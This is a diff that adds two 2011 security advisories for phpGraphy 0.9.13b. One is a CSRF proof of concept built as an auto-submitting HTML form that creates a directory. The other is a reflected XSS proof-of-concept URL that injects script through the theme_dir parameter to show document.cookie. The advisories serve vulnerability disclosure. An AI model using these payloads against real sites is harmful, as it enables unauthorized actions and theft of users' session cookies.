@@ -1,0 +1,51 @@
+=====================================
+Vulnerability ID: HTB22959
+Reference: http://www.htbridge.ch/advisory/csrf_cross_site_request_forgery_in_phpgraphy.html
+Product: phpGraphy 
+Vendor: http://phpgraphy.sourceforge.net/ ( http://phpgraphy.sourceforge.net/ ) 
+Vulnerable Version: 0.9.13b
+Vendor Notification: 14 April 2011 
+Vulnerability Type: CSRF (Cross-Site Request Forgery)
+Risk level: Low 
+Credit: High-Tech Bridge SA Security Research Lab ( http://www.htbridge.ch/advisory/ ) 
+
+Vulnerability Details:
+The vulnerability exists due to failure in the "index.php" script to properly verify the source of HTTP request.
+Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+Attacker can use browser to exploit this vulnerability. The following PoC is available: 
+
+
+<form action="http://[host]/index.php" method="post" name="main" id="main">
+<input type="hidden" name="createdirname" value="1">
+<input type="hidden" name="dircreate" value="1">
+<input type="hidden" name="dir" value="">
+<input type="hidden" name="submit" value="OK">
+<input type="submit" id="btn"> 
+</form>
+<script>
+document.getElementById('btn').click();
+</script>
+
+
+=====================================
+Vulnerability ID: HTB22958
+Reference: http://www.htbridge.ch/advisory/xss_in_phpgraphy.html
+Product: phpGraphy 
+Vendor: http://phpgraphy.sourceforge.net/ ( http://phpgraphy.sourceforge.net/ ) 
+Vulnerable Version: 0.9.13b
+Vendor Notification: 14 April 2011 
+Vulnerability Type: XSS (Cross Site Scripting)
+Risk level: Medium 
+Credit: High-Tech Bridge SA Security Research Lab ( http://www.htbridge.ch/advisory/ ) 
+
+Vulnerability Details:
+User can execute arbitrary JavaScript code within the vulnerable application.
+The vulnerability exists due to failure in the "/themes/default/header.inc.php" script to properly sanitize user-supplied input in "theme_dir" variable then register_globals on. 
+Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+The following PoC is available:  
+
+
+http://[host]/themes/default/header.inc.php?theme_dir=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+
